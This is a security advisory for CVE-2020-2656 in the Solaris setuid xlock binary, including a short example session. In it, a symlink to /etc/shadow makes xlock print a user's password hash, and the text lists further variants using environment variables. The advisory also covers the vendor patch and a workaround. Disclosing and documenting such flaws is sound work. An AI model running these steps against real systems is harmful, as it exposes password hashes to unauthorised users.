@@ -1,0 +1,115 @@
+@Mediaservice.net Security Advisory #2020-01 (last updated on 2020-01-15)
+
+         Title:	Low impact information disclosure via Solaris xlock
+   Application:	Setuid root xlock binary distributed with Solaris
+     Platforms:	Oracle Solaris 11.x (confirmed on 11.4 X86)
+		Oracle Solaris 10 (confirmed on 10 1/13 X86)
+		OpenIndiana Hipster 2019.10 and earlier
+		Other platforms are potentially affected
+   Description:	A low impact information disclosure vulnerability in the setuid
+		root xlock binary distributed with Solaris may allow local
+		users to read partial contents of potentially sensitive files
+        Author:	Marco Ivaldi <marco.ivaldi@mediaservice.net>
+ Vendor Status:	<secalert_us@oracle.com> notified on 2019-09-24
+      CVE Name:	CVE-2020-2656
+   CVSS Vector: CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (Base Score: 4.4)
+    References: https://github.com/0xdea/advisories/blob/master/2020-01-solaris-xlock.txt
+		https://www.oracle.com/security-alerts/cpujan2020.html
+		https://www.oracle.com/technetwork/server-storage/solaris11/
+		https://www.oracle.com/technetwork/server-storage/solaris10/
+		https://www.openindiana.org/
+		https://github.com/oracle/solaris-userland/tree/master/components/x11/app/xlock/sun-src
+		https://www.mediaservice.net/
+		https://0xdeadbeef.info/
+
+1. Abstract.
+
+A low impact information disclosure vulnerability in the setuid root xlock
+binary distributed with Solaris may allow local users to read partial contents
+of sensitive files. Due to the fact that target files must be in a very
+specific format, exploitation of this flaw to escalate privileges in a
+realistic scenario is unlikely.
+
+2. Example Attack Session.
+
+In order to reproduce this bug, the following commands can be used:
+
+raptor@stalker:~$ cat /etc/release
+                             Oracle Solaris 11.4 X86
+  Copyright (c) 1983, 2018, Oracle and/or its affiliates.  All rights reserved.
+                            Assembled 16 August 2018
+raptor@stalker:~$ uname -a
+SunOS stalker 5.11 11.4.0.15.0 i86pc i386 i86pc
+raptor@stalker:~$ id
+uid=100(raptor) gid=10(staff)
+raptor@stalker:~$ tail -1 /etc/passwd
+user.mode:x:101:10::/export/home/user:/usr/bin/bash
+raptor@stalker:~$ ln -s /etc/shadow .Xdefaults
+raptor@stalker:~$ Xorg :1 &
+raptor@stalker:~$ xlock -name user -display :1
+Unknown mode: xlock:  bad command line option "$5$rounds=10000$wHWiSUhf$NKjMUwIRiVVB/GYx.HZvnMhou9RUT.qaiJhKg265um7:18160::::::"
+
+3. Discussion.
+
+The detected information disclosure happens because xlock does not drop root
+privileges and follows a malicious symlink to an arbitrary file when opening
+the ~/.Xdefaults configuration file with the XrmGetFileDatabase() function of
+libX11. Subsequently, xlock's CheckResources() function prints partial contents
+of the last line of the file that matches the following pattern (the
+resource-name string can be specified with the -name command line switch of
+xlock):
+
+[resource-name].mode:[sensitive data]
+
+For instance, if a username in the shadow file ends with the string ".mode"
+(e.g. "user.mode" as shown in the above example) it is possible for a low
+privileged user to exploit this flaw in order to reveal the corresponding
+password hash. Similar results can be achieved in case of usernames that end
+with the following strings:
+
+* ".font": the password hash is included in an error message printed by xlock
+* ".info": the password hash is displayed as part of xlock's unlock dialog 
+* ".validate": the password hash is displayed as part of xlock's unlock dialog 
+
+Instead of creating a symlink, an attacker could exploit this flaw by directly
+setting the XFILESEARCHPATH or XUSERFILESEARCHPATH environment variables to
+point to /etc/shadow. In this case, the password hash associated with usernames
+that end with the ".display" string can also be recovered. The XAPPLRESDIR
+environment variable can also be manipulated to achieve similar results.
+Finally, the directive #include "/etc/shadow" in a configuration file can also
+be used to trick xlock into opening the /etc/shadow file.
+
+Other exploitation vectors may be available.
+
+4. Affected Platforms.
+
+This bug was confirmed on the following platforms:
+
+* Oracle Solaris 11.x (confirmed on 11.4 X86)
+* Oracle Solaris 10 (confirmed on 10 1/13 X86)
+* OpenIndiana Hipster 2019.10 and earlier
+
+Other Oracle Solaris versions (including those that run on the SPARC
+architecture) are also likely affected.
+
+5. Fix.
+
+Oracle has assigned the tracking# S1212411 and has released a fix for all
+affected and supported versions of Solaris in their Critical Patch Update (CPU)
+of January 2020.
+
+Oracle's patch is available in the solaris-userland open source repository on
+GitHub (see commit "30352568 problem in X11/XCLIENTS"):
+https://github.com/oracle/solaris-userland/commit/0b48514166d1fedf21c75a2c1af2afe55e087f23
+
+OpenIndiana's patch is available in the oi-userland repository on GitHub (see
+commit "xlock: Sync with solaris-userland (security) #5421):
+https://github.com/OpenIndiana/oi-userland/pull/5421/commits/dd92fe1f71bd25432a3b7559717d23047099437f
+
+As a temporary workaround, it is also possible to remove the setuid bit from
+the xlock executable as follows (note that this might prevent it from working
+properly):
+
+bash-3.2# chmod -s /usr/bin/xlock
+
+Copyright (c) 2020 Marco Ivaldi and @Mediaservice.net. All rights reserved.
